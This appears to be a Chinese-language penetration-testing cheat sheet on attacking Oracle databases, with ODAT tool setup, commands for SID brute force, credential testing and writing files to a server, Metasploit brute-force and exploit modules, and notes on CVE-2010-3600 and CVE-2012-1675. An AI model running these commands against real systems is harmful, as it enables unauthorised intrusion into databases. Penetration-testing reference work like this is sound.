# Oracle

Oracle Database Server 是美国甲骨文（Oracle）公司的一套关系数据库管理系统。该数据库管理系统提供数据管理、分布式处理等功能。

> fofa : app="Oracle-数据库"

**版本号**
- oracle 版本号是真的乱,Oracle 数据库版本号请看维基百科 [Oracle Database](https://en.wikipedia.org/wiki/Oracle_Database)

**注入**
- [Oracle数据库注入笔记](../Web安全/Web_Generic/SQLi.md#Oracle)

**Tips**

- scott 用户默认没有启用
- 可以用 oracle 的账号试试 ssh 的爆破

**相关文章**
- [How to hack an Oracle database server](https://hackingprofessional.github.io/Security/how-to-hack-an-Oracle-database-server/)

**相关渗透工具**
- [jas502n/oracleShell](https://github.com/jas502n/oracleShell) - oracle 数据库命令执行工具,支持连接的 Oracle 版本较低
- [quentinhardy/odat](https://github.com/quentinhardy/odat) - Oracle 数据库攻击工具,支持功能包括爆破 SID,提权,命令执行
    ```bash
    # 安装
    apt install -y libaio1 alien
    apt install -y python3-scapy
    pip3 install colorlog termcolor pycrypto passlib cx_Oracle pyinstaller
    pip3 install argcomplete && activate-global-python-argcomplete
    git clone https://github.com/quentinhardy/odat.git

    # 访问 https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html 下载 rpm 包
    alien --to-deb oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
    dpkg -i oracle-instantclient19.6-basic_19.6.0.0.0-2_amd64.deb
    export ORACLE_HOME=/usr/lib/oracle/19.6/client64/
    export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
    export PATH=${ORACLE_HOME}bin:$PATH

    sudo -s
    sources /etc/profile
    python3 -c 'import cx_Oracle'
    python3 odat.py -h
    ```
    ```bash
    python3 odat.py all -s 192.168.1.254 -p 1521
    python3 odat.py all -s 192.168.1.254 -p 1521 -d ORA19C -U system -P Test1234

    # 信息收集
    python3 odat.py tnscmd -s 192.168.1.254 -p 1521 --ping
    python3 odat.py tnscmd -s 192.168.1.254 -p 1521 --version
    python3 odat.py tnscmd -s 192.168.1.254 -p 1521 --status

    # 写文件
    echo "Hacked By Gerh" > /tmp/File-Test.txt
    python3 odat.py dbmsxslprocessor -s 192.168.1.254 -p 1521 -d ORA19C -U system -P Test1234 --putFile "/tmp" "File-Test.txt" "/tmp/File-Test.txt"
    ```

**MSF 爆破**
```bash
use admin/oracle/oracle_login
set RHOSTS [IP]
set SID [SID]
run
```

**CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP 代码执行漏洞**
- 漏洞描述

    Oracle Database Server 11.1.0.7 和 11.2.0.1 版本，以及 Enterprise Manager Grid Control 10.2.0.5 版本的 Client System Analyzer 组件中存在未明漏洞。远程攻击者可借助未知向量影响机密性、完整性和可用性。

- 影响版本
    - Oracle:Enterprise_manager_grid_control:10.2.0.5:::
    - Oracle:Database_server:11.1.0.7:::
    - Oracle:Database_server:11.2.0.1:::

- MSF 模块
    ```bash
    use exploit/windows/oracle/client_system_analyzer_upload
    ```

**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
- 漏洞描述

    Oracle Database Server 在实现上存在可允许攻击者向远程“TNS Listener”组件处理的数据投毒的漏洞。攻击者可利用此漏洞将数据库服务器的合法“TNS Listener”组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的攻击者攻击、会话劫持或拒绝服务攻击。

- 影响版本
    - Oracle:Database_server:11.2.0.4:::
    - Oracle:Database_server:11.2.0.3:::
    - Oracle:Database_server:11.2.0.2:::
    - Oracle:Database_server:11.1.0.7:::
    - Oracle:Database_server:10.2.0.5:::

- 相关文章
    - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)
    - [ORACLE TNS Listener远程注册投毒（Poison Attack）漏洞](https://blog.csdn.net/wengtf/article/details/46632405)

- MSF 模块
    ```bash
    use auxiliary/admin/oracle/tnscmd       # 该漏洞可以远程获取到 oracle 的内存信息,若是能获取到内存中的数据即为存在漏洞.
    set rhosts [ip]
    run

    use auxiliary/admin/oracle/sid_brute    # 爆破 oracle 的 SID
    set rhosts [ip]
    run
    ```
